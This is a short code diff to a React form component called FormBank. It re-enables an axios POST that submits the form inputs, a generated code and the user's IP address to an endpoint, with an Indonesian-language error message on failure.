@@ -45,7 +45,6 @@ const FormBank = ({
     const name = event.target.name;
     const value = event.target.value;
     
-
     setInputs((values) => ({ ...values, [name]: value }));
   };
 
@@ -79,15 +78,14 @@ const FormBank = ({
   const submitForm = () => {
     const code = generateCode();
     const updatedInputs = { ...inputs, code, ip_user: ip };
-    // axios
-    //   .post(endpoint, updatedInputs)
-    //   .then((response) => {
-    //     navigate("/success");
-    //   })
-    //   .catch((err) => {
-    //     toast.error("Gagal Memasukkan Data, Mohon Perhatikan Lagi!");
-    //   });
-    console.log(updatedInputs)
+    axios
+      .post(endpoint, updatedInputs)
+      .then((response) => {
+        navigate("/success");
+      })
+      .catch((err) => {
+        toast.error("Gagal Memasukkan Data, Mohon Perhatikan Lagi!");
+      });
   };
 
   return (
